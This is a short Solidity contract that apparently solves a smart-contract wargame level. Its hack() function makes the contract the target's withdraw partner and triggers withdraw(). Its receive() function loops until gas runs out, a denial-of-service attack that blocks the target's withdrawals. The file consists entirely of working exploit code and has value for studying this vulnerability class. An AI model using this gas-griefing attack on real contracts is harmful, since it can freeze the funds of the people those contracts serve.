// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
contract solver{
    bytes[] public trash;
    address public add;
    uint public t;
    constructor(address target) public {
        add = target;
    }
    receive() external payable {
        // run out of gas can cause a DOS vuln
        uint gl = gasleft();
        while (gl>=500) 
        {
            t+=1;
            gl=gasleft();
        }
    }
    function hack() public{
        bytes memory data = abi.encodeWithSignature("setWithdrawPartner(address)", address(this));
        (bool success, ) = add.call(data);
        require(success);
        data = abi.encodeWithSignature("withdraw()");
        (success, ) = add.call(data);
    }
    
}